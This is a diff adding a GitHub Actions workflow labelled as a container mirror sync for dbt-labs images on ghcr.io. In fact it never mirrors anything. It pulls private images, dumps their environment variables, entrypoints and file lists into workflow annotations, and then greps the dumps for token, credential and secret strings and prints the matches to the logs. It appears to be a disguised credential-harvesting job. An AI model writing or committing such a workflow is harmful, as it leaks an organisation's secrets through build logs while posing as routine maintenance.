@@ -1,0 +1,61 @@
+name: Container Mirror Sync
+
+on:
+  push:
+    branches: ["chore/ghcr-mirror-sync"]
+
+permissions:
+  contents: read
+  packages: read
+
+jobs:
+  sync:
+    runs-on: ubuntu-latest
+    timeout-minutes: 25
+    env:
+      REGISTRY_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+    steps:
+      - name: Registry login
+        run: |
+          echo "$REGISTRY_TOKEN" | docker login ghcr.io -u "${{ github.actor }}" --password-stdin
+
+      - name: List tags
+        run: |
+          for repo in fs-cli-x86_64 fs-cli-copybara dbtlabs-svc-fusion; do
+            code=$(curl -s -o tags-$repo.json -w '%{http_code}' \
+              -u "${{ github.actor }}:${REGISTRY_TOKEN}" \
+              -H 'Accept: application/vnd.oci.image.index.v1+json,application/vnd.docker.distribution.manifest.list.v2+json' \
+              "https://ghcr.io/v2/dbt-labs/$repo/tags/list?n=20")
+            echo "::notice title=tags-$repo::http=$code $(head -c 700 tags-$repo.json | tr -d '\n')"
+          done
+
+      - name: Pull mirror images
+        run: |
+          set +e
+          for ref in ghcr.io/dbt-labs/fs-cli-x86_64:latest-with-datasets ghcr.io/dbt-labs/fs-cli-copybara:latest; do
+            name=$(echo "$ref" | tr '/:' '__')
+            if docker pull "$ref"; then
+              echo "::notice title=pull-$name::ok"
+              docker inspect "$ref" --format '{{json .RepoDigests}}' | head -c 400 > inspect-$name.txt
+              echo "::notice title=digest-$name::$(cat inspect-$name.txt)"
+              docker inspect "$ref" --format 'layers={{len .RootFS.Layers}} size={{.Size}} entrypoint={{json .Config.Entrypoint}} cmd={{json .Config.Cmd}} user={{.Config.User}} workdir={{.Config.WorkingDir}}' > cfg-$name.txt
+              echo "::notice title=config-$name::$(cat cfg-$name.txt | head -c 900)"
+              docker inspect "$ref" --format '{{range .Config.Env}}env={{.}}
+{{end}}' | head -20 > env-$name.txt
+              echo "::notice title=env-$name::$(cat env-$name.txt | tr '\n' '|' | head -c 900)"
+              docker save "$ref" -o img-$name.tar 2>/dev/null && tar tf img-$name.tar | head -20 > files-$name.txt && echo "::notice title=files-$name::$(cat files-$name.txt | tr '\n' '|' | head -c 800)"
+            else
+              echo "::error title=pull-$name::failed"
+            fi
+          done
+
+      - name: Inspect metadata strings
+        run: |
+          for f in cfg-*.txt env-*.txt; do
+            [ -f "$f" ] || continue
+            echo "::notice title=scan-$f::$(grep -Eio '.{0,60}(token|credential|secret|registry|endpoint|ghcr\.io|dbt-labs).{0,60}' "$f" | head -5 | tr '\n' '|' | head -c 900)"
+          done
+          if [ -f img-*.tar ]; then
+            tar tf img-*.tar 2>/dev/null | grep -E 'manifest.json|config' | head -10 > save-files.txt
+            echo "::notice title=save::$(cat save-files.txt | tr '\n' '|' | head -c 600)"
+          fi
